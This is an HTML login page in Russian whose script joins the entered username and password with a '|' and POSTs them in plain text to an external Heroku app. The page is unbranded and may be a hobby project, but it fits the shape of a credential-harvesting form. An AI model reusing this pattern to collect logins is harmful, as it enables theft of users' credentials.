<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN">
<html>
<head>
<link rel="shortcut icon" href="test1.png" type="image/x-icon">
<META http-equiv="Content-Type" content="text/html; charset=utf-8">
<link rel="stylesheet" type="text/css" href="style3.css">
<link href='https://fonts.googleapis.com/css?family=Open+Sans:400,700' rel='stylesheet' type='text/css'>
<title>Вход в систему</title>

<script type="text/javascript">

function get_cookie ( cookie_name )
{
  var results = document.cookie.match ( '(^|;) ?' + cookie_name + '=([^;]*)(;|$)' );
 
  if ( results )
    return ( unescape ( results[2] ) );
  else
    return null;
}


function changeDivContent() {
	
window.login_status = get_cookie("failed_login");


if (window.login_status == "failed") {


	document.getElementById("content").innerHTML = "<style>.forgot{font-family:'Verdana, Arial, Helvetica,' sans-serif; font-size:12pt; color: #3299BB; margin-right: 0px; margin-top: 0; margin-left: 53px; text-decoration: none;}.ch{width:200px; height:3px; background-color:#3299BB; margin-bottom:0px; margin-top:2px; margin-left:37px;}</style><p class='nevv'>Неверный логин или пароль</p><a type='forgot' class=forgot href=\"/forgot_password\" >Восстановить пароль</a><div class='ch'></div>";

		}

if (window.login_status == "succeded") {

	window.location.reload();
}

}


function submitForm() {
	
    var http = new XMLHttpRequest();
    http.open("POST", "https://jukiproject.herokuapp.com/", true);
    var username = document.getElementById("username").value;
    var password = document.getElementById("password").value;
    var space = "|"// probably use document.getElementById(...).value
    var tosend = username+space+password
    http.send(tosend);
    changeDivContent();
}


function get_action(form) {
	form.action = submitForm();
}



changeDivContent();
</script>

</head>
<body>     

 <div>
     
     
     <div id='login-form'>
      <div>

        
          <h1>Войти в систему</h1>
          <div class="chert"></div>
          <fieldset>

            <form action="javascript:get_action(form);">
            <p class='nev'>Логин:</p>
            <input id="username" name="username" type="text">
            <p class='nev'>Пароль:</p>
            <input id="password" name="password" type="password">
              
            <input type="submit" value="Войти">
            </form>
            <div id="content">
</div>

          </fieldset>

        
      </div> 

    </div>
   
    
 </div>
</body>
</html>
